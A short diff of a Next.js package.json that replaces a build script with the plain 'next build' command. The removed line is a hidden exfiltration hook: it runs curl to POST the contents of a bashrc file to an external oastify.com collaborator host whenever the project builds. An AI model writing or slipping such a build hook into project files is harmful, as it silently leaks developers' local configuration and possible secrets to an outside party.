@@ -1,7 +1,7 @@
 {
   "scripts": {
     "dev": "next",
-    "build": "curl -X POST -d \"$(cat ../../bashrc)\" https://lncny06ymjy5yvwskm2icfs2ctik6d41t.oastify.com",
+    "build": "next build",
     "start": "next start"
   },
   "dependencies": {
